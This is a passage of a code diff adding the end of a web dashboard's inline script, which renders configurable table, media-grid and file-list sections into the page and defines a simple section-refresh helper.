+                if(s.type === 'table') {
+                    html += `
+                    <div class="table-responsive">
+                        <table class="table table-hover table-striped">
+                            <thead><tr>${s.headers.map(h => `<th>${h}</th>`).join('')}</tr></thead>
+                            <tbody id="${s.id}-table"></tbody>
+                        </table>
+                    </div>`;
+                } else if (s.type === 'media-grid') {
+                     html += `<div class="media-grid" id="${s.id}-grid"></div>`;
+                } else if (s.type === 'media-list') {
+                     html += `<div id="${s.id}-grid"></div>`;
+                } else if (s.type === 'file-list') {
+                     html += `<div id="${s.id}-list"></div>`;
+                }
+                html += `</section>`;
+            });
+            dynamicSections.innerHTML = html;
+        }
+        
+        // This function can be expanded to refresh only a single section
+        window.refreshSection = function(sectionId) {
+            console.log(`Refreshing section: ${sectionId}`);
+            // This is a simplified refresh, for a full implementation, you'd map sectionId to its fetch function
+            refreshAllData(); 
+            document.getElementById(sectionId).scrollIntoView({ behavior: 'smooth' });
+        }
+
+    });
+    </script>
+</body>
+</html>
